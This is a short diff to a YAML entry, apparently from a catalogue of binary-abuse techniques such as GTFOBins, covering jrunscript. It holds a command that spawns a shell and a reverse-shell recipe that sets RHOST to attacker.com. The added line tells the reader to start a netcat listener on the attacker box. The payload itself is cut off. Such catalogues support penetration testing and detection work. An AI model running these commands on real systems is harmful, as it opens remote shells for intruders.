@@ -4,7 +4,8 @@ functions:
   shell:
     - code: jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
   reverse-shell:
-    - code: |
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+      code: |
         export RHOST=attacker.com
         export RPORT=12345
         jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
